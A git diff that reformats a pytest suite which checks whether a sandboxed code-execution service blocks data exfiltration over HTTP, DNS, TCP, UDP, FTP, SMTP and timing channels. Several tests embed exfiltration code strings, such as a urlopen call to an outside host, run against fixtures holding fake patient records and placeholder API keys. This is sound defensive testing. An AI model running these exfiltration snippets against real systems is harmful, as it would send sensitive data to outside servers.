@@ -11,15 +11,16 @@ Test Naming Convention:
 Run with: pytest tests/manual/custom_code_execution/01_data_exfiltration/test_network_exfiltration.py -v
 """
 
-import pytest
 import time
 from pathlib import Path
+
 import anndata
 import numpy as np
 import pandas as pd
+import pytest
 
 from lobster.core.data_manager_v2 import DataManagerV2
-from lobster.services.execution import CustomCodeExecutionService, CodeExecutionError
+from lobster.services.execution import CodeExecutionError, CustomCodeExecutionService
 
 
 class TestNetworkExfiltration:
@@ -32,11 +33,17 @@ class TestNetworkExfiltration:
         workspace.mkdir()
 
         # Create sensitive data file
-        sensitive_df = pd.DataFrame({
-            'patient_id': ['P001', 'P002', 'P003'],
-            'diagnosis': ['CRC', 'IBD', 'Control'],
-            'api_key': ['sk-ant-api03-SECRET', 'sk-ant-api03-SECRET2', 'sk-ant-api03-SECRET3']
-        })
+        sensitive_df = pd.DataFrame(
+            {
+                "patient_id": ["P001", "P002", "P003"],
+                "diagnosis": ["CRC", "IBD", "Control"],
+                "api_key": [
+                    "sk-ant-api03-SECRET",
+                    "sk-ant-api03-SECRET2",
+                    "sk-ant-api03-SECRET3",
+                ],
+            }
+        )
         sensitive_df.to_csv(workspace / "patient_data.csv", index=False)
 
         return workspace
@@ -49,13 +56,18 @@ class TestNetworkExfiltration:
         # Add test modality with sensitive metadata
         adata = anndata.AnnData(
             X=np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]),
-            obs=pd.DataFrame({
-                'patient': ['P001', 'P002', 'P003'],
-                'condition': ['cancer', 'disease', 'control']
-            }, index=['c1', 'c2', 'c3']),
-            var=pd.DataFrame({'gene': ['BRCA1', 'TP53', 'KRAS']}, index=['g1', 'g2', 'g3'])
+            obs=pd.DataFrame(
+                {
+                    "patient": ["P001", "P002", "P003"],
+                    "condition": ["cancer", "disease", "control"],
+                },
+                index=["c1", "c2", "c3"],
+            ),
+            var=pd.DataFrame(
+                {"gene": ["BRCA1", "TP53", "KRAS"]}, index=["g1", "g2", "g3"]
+            ),
         )
-        dm.modalities['sensitive_data'] = adata
+        dm.modalities["sensitive_data"] = adata
 
         return dm
 
@@ -72,14 +84,14 @@ class TestNetworkExfiltration:
         Expected: SUCCESS (vulnerability - network not blocked)
         Impact: CRITICAL - Can exfiltrate data to external servers
         """
-        code = '''
+        code = """
 import urllib.request
 try:
     response = urllib.request.urlopen('http://httpbin.org/status/200', timeout=5)
     result = f"VULNERABILITY: Network access allowed, status={response.code}"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -87,7 +99,9 @@ except Exception as e:
 
         if "VULNERABILITY" in str(result):
             print("⚠️  CRITICAL VULNERABILITY: HTTP requests allowed via urllib")
-            assert "VULNERABILITY" in str(result), "Network exfiltration possible via urllib"
+            assert "VULNERABILITY" in str(
+                result
+            ), "Network exfiltration possible via urllib"
         else:
             print("✅ PROTECTED: HTTP requests blocked")
             assert "PROTECTED" in str(result)
@@ -98,7 +112,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - can POST sensitive data)
         Impact: CRITICAL - Direct data theft
         """
-        code = '''
+        code = """
 import urllib.request
 import json
 
@@ -119,15 +133,19 @@ try:
     result = f"VULNERABILITY: Data exfiltrated via HTTP POST (status {response.code})"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}: {str(e)[:50]}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
         print(f"\n[HTTP POST Exfiltration] Result: {result}")
 
         if "VULNERABILITY" in str(result):
-            print("⚠️  CRITICAL VULNERABILITY: Can POST sensitive data to external servers")
-            assert "VULNERABILITY" in str(result), "Data exfiltration via HTTP POST possible"
+            print(
+                "⚠️  CRITICAL VULNERABILITY: Can POST sensitive data to external servers"
+            )
+            assert "VULNERABILITY" in str(
+                result
+            ), "Data exfiltration via HTTP POST possible"
         else:
             print("✅ PROTECTED: HTTP POST blocked")
             assert "PROTECTED" in str(result)
@@ -138,7 +156,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability)
         Impact: CRITICAL - Covert data exfiltration
         """
-        code = '''
+        code = """
 import urllib.request
 import urllib.parse
 
@@ -152,7 +170,7 @@ try:
     result = f"VULNERABILITY: Encoded data in URL, status={response.code}"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -173,7 +191,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - DNS not blocked)
         Impact: CRITICAL - Covert channel, hard to detect
         """
-        code = '''
+        code = """
 import socket
 
 try:
@@ -190,14 +208,16 @@ try:
         result = f"VULNERABILITY: DNS exfiltration possible (query sent, no response expected)"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
         print(f"\n[DNS Exfiltration] Result: {result}")
 
         if "VULNERABILITY" in str(result):
-            print("⚠️  CRITICAL VULNERABILITY: DNS queries allowed - covert exfiltration channel")
+            print(
+                "⚠️  CRITICAL VULNERABILITY: DNS queries allowed - covert exfiltration channel"
+            )
             assert "VULNERABILITY" in str(result)
         else:
             print("✅ PROTECTED: DNS queries blocked")
@@ -211,7 +231,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - sockets not blocked)
         Impact: CRITICAL - Bypasses HTTP-level restrictions
         """
-        code = '''
+        code = """
 import socket
 
 try:
@@ -229,7 +249,7 @@ try:
         result = "VULNERABILITY: TCP socket creation allowed (connection failed)"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -248,7 +268,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - UDP not blocked)
         Impact: CRITICAL - Connectionless exfiltration
         """
-        code = '''
+        code = """
 import socket
 
 try:
@@ -264,14 +284,16 @@ try:
     sock.close()
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
         print(f"\n[UDP Socket] Result: {result}")
 
         if "VULNERABILITY" in str(result):
-            print("⚠️  CRITICAL VULNERABILITY: UDP sockets allowed - connectionless exfiltration")
+            print(
+                "⚠️  CRITICAL VULNERABILITY: UDP sockets allowed - connectionless exfiltration"
+            )
             assert "VULNERABILITY" in str(result)
         else:
             print("✅ PROTECTED: UDP sockets blocked")
@@ -285,7 +307,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - another HTTP library)
         Impact: CRITICAL - Alternative to urllib
         """
-        code = '''
+        code = """
 import http.client
 
 try:
@@ -296,7 +318,7 @@ try:
     conn.close()
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -315,7 +337,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - FTP not blocked)
         Impact: HIGH - Alternative exfiltration channel
         """
-        code = '''
+        code = """
 from ftplib import FTP
 
 try:
@@ -324,7 +346,7 @@ try:
     result = "VULNERABILITY: FTP library import successful (connection would work with valid server)"
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -345,7 +367,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - SMTP not blocked)
         Impact: HIGH - Email-based exfiltration
         """
-        code = '''
+        code = """
 import smtplib
 
 try:
@@ -359,14 +381,16 @@ except Exception as e:
         result = "VULNERABILITY: SMTP library accessible (network connection attempted)"
     else:
         result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
         print(f"\n[SMTP Email] Result: {result}")
 
         if "VULNERABILITY" in str(result):
-            print("⚠️  HIGH VULNERABILITY: SMTP accessible - email exfiltration possible")
+            print(
+                "⚠️  HIGH VULNERABILITY: SMTP accessible - email exfiltration possible"
+            )
             assert "VULNERABILITY" in str(result)
         else:
             print("✅ PROTECTED: SMTP blocked")
@@ -380,7 +404,7 @@ except Exception as e:
         Expected: SUCCESS (vulnerability - covert timing channel)
         Impact: MEDIUM - Slow but undetectable
         """
-        code = '''
+        code = """
 import socket
 import time
 
@@ -403,7 +427,7 @@ try:
     sock.close()
 except Exception as e:
     result = f"PROTECTED: {type(e).__name__}"
-'''
+"""
 
         result, stats, ir = service.execute(code, persist=False, timeout=10)
 
@@ -422,9 +446,9 @@ class TestNetworkExfiltrationSummary:
 
     def test_generate_summary(self):
         """Print summary of network attack vectors."""
-        print("\n" + "="*70)
+        print("\n" + "=" * 70)
         print("NETWORK EXFILTRATION ATTACK SURFACE SUMMARY")
-        print("="*70)
+        print("=" * 70)
         print("\nTested Attack Vectors:")
         print("1. ⚠️  HTTP GET (urllib)")
         print("2. ⚠️  HTTP POST with data")
@@ -437,6 +461,6 @@ class TestNetworkExfiltrationSummary:
         print("9. ⚠️  SMTP email")
         print("10. ⚠️ Timing side-channels")
         print("\nExpected Result: All 10 vulnerabilities should be confirmed")
-        print("="*70 + "\n")
+        print("=" * 70 + "\n")
 
         assert True  # Always pass - this is just a summary
